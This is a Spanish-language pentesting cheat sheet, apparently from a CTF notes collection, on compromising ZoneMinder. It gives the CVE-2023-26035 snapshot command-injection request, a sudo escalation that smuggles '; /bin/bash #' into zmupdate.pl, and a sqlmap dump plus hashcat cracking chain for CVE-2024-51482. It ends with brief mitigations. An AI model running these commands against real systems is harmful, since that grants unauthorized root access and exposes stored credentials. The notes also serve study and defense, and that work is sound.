---
topic: ZoneMinder y ejecución de comandos
tags: [linux, zoneminder, cve, command-injection, privesc]
---

# ZoneMinder y ejecución de comandos

[🌐 English](zoneminder-command-injection.en.md) | **Español**

## Concepto

ZoneMinder expone paneles y scripts de mantenimiento. Algunas versiones permiten ejecutar comandos sin autenticación mediante la acción `snapshot`, y los scripts `zm*.pl` ejecutados con privilegios pasan parámetros a una shell. Ambos caminos pueden llevar de `www-data` a root.

## Cuándo aplica

- ZoneMinder está en la versión 1.36.32 o similar.
- El panel o los scripts `zm*.pl` son accesibles.
- `sudo -l` permite ejecutar scripts de ZoneMinder.

## Procedimiento

1. Confirmar la versión y el endpoint vulnerable.
2. Enviar el payload de CVE-2023-26035 o inyectar en el parámetro del script.
3. Recibir la shell como `www-data` o root.
4. Enumerar la base y los archivos de configuración.

```bash
curl -s 'http://<IP>/zm/index.php?view=request&request=snapshot&id=1&command=<PAYLOAD>'
sudo -l
sudo /usr/bin/zmupdate.pl --user='; /bin/bash #'
```

### Variante: SQLi en ZoneMinder 1.37.63 (CCTV)

CCTV usa CVE-2024-51482, una SQLi ciega en el manejo de eventos. Con una sesión válida se vuelca la base, se crackea el hash bcrypt de un usuario y se entra por SSH. Desde allí, `tcpdump` captura credenciales en claro y motionEye se explota con CVE-2025-60787 para llegar a root.

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=...' \
  --cookie='ZMSESSID=<SESSION>' --batch --dump
hashcat -m 3200 zm.hashes rockyou.txt
```

## Variantes

- Usar `LD_PRELOAD` con un script Perl privilegiado.
- Aprovechar CVE-2024-51482 para volcar usuarios y reutilizar la contraseña.
- Escribir un PHP en el webroot.
- Aprovechar credenciales de la base para el panel.

## Limitaciones

- La versión debe ser vulnerable.
- El endpoint debe aceptar el parámetro.
- Los scripts pueden tener rutas o nombres distintos.

## Mitigación y detección

- Actualizar ZoneMinder y restringir el panel.
- No conceder `sudo` sobre scripts con parámetros.
- Auditar procesos hijos y accesos a `zm*.pl`.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2023-26035>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-51482>
- <https://zoneminder.com/>
- <https://attack.mitre.org/techniques/T1059/004/>
